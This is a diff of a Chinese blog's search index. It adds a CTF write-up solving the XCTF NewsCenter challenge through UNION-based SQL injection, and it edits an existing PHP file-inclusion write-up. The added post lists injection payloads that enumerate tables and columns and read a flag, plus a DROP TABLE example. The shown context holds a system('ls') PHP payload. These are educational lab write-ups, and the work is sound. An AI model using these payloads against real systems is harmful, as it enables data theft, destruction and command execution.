@@ -1,9 +1,64 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>模糊查询之SQL注入（攻防世界NewsCenter题解）</title>
+    <url>/2022/05/22/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CNewsCenter%E9%A2%98%E8%A7%A3%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>SQL</code>注入是由于开发人员编写程序不当，攻击者可以在开发人员编写好的<code>SQL</code>语句的基础上，构造额外的<code>SQL</code>语句，从而发生意外的错误。</p>
+<p>例如，如果我们有一个根据<code>id</code>查询的语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = test_id</span><br></pre></td></tr></table></figure>
+
+<p>使用高级语言编写语句：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql = <span class="string">"select * from test_table where id = "</span> + test_id;</span><br></pre></td></tr></table></figure>
+
+<p>如果攻击者尝试将<code>test_id</code>构造成</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">2;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>
+
+<p>那么最终执行的<code>SQL</code>语句为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>
+
+<p>当然你可能会说攻击者不知道表名，因此上面的很难构造出来。但是我想说的是如果存在<code>SQL</code>注入风险的时候，<strong>攻击者获取表名的方式你难以想象得到</strong>。</p>
+<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>攻防世界<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1" target="_blank" rel="noopener"><code>NewsCenter</code></a></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开场景后，发现是一个新闻页面，输入框中输入内容，然后进行模糊查询。</p>
+<p>而模糊查询的一般语句为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%str%'</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试输入<code>%&#39;</code>，发现后台报错，因此判定后台可以进行<code>SQL</code>注入。</p>
+<p>然后略加思考，<code>flag</code>应该就藏在当前的数据库中？因此先数据库名；先输入<code>%&#39;;SELECT DATABASE(); --</code>（中划线是将后面的<code>SQL</code>语句处理成注释形式），发现并没有返回预期的结果，然后想了想，查询到的数据应该是有好几列，然后一行是一个新闻，将其渲染，再返回到浏览器，接着分析了一下，每个新闻都有标题和内容，查询应该至少有两列，再次尝试构造<code>SQL</code>语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><code>UNION</code>的意思是说将两个查询结果合并，可以执行的前提是两个查询有相同的列数，具体用法可以去网上查查。</p>
+<p>发现还是报错，再次增加一列进行尝试：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(), <span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>果然在最后的新闻列表中出现了数据库名<code>news</code>。</p>
+<p>然后看看该数据库中都有哪些表：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaaaaa%' UNION <span class="keyword">SELECT</span> table_name,table_name,table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'news'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>aaaaaaaa</code>可以随便设置，最好是新闻中没有出现过的字符，这样子就方便获取我们想要的内容了。</p>
+</blockquote>
+<p>然后发现有两张表，一个是<code>news</code>，另一个是<code>secret_table</code>！</p>
+<p>然后看看第二张表的字段名：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> COLUMN_NAME,COLUMN_NAME,COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'secret_table'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>出现了一个<code>fl4g</code>字段名，再继续查询</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> fl4g, fl4g, fl4g <span class="keyword">FROM</span> secret_table; <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>返回了<code>QCTF{sq1_inJec7ion_ezzz}</code>。至此，本题答案<strong>水落石出</strong></p>
+<hr>
+<p>==黑帽白帽，就在一念之间！==</p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+      <tags>
+        <tag>MySql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界Web_php_include题解</title>
     <url>/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/</url>
-    <content><![CDATA[<p>题目地址：<a href><code>Web_php_include</code></a></p>
+    <content><![CDATA[<p>题目地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1" target="_blank" rel="noopener"><code>Web_php_include</code></a></p>
 <p>打开场景后，是<code>index.php</code>的源码：<a id="more"></a></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -22,7 +77,7 @@
 </li>
 </ul>
 <p>结合本题，我们应该构造下面的请求：</p>
-<p><img src="/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/C:%5CUsers%5CYalexin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220520115557474.png" alt="image-20220520115557474"></p>
+<p><img src="/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/D:%5CjsProject%5Chexo-blog-files%5Csource_posts%5C%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3%5Cimage-20220520115557474.png" alt="image-20220520115557474"></p>
 <p>提交过后，果然在页面中获取了很多信息。</p>
 <p>那我们看看当前目录下都有哪些文件吧：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -369,9 +424,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -437,9 +492,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -489,9 +544,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -561,9 +616,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -727,9 +782,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -875,9 +930,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -927,9 +982,9 @@
         <category>笔记</category>
       </categories>
       <tags>
+        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
-        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -5030,8 +5085,8 @@
         <category>Linux相关</category>
       </categories>
       <tags>
-        <tag>学习</tag>
         <tag>命令行</tag>
+        <tag>学习</tag>
       </tags>
   </entry>
   <entry>
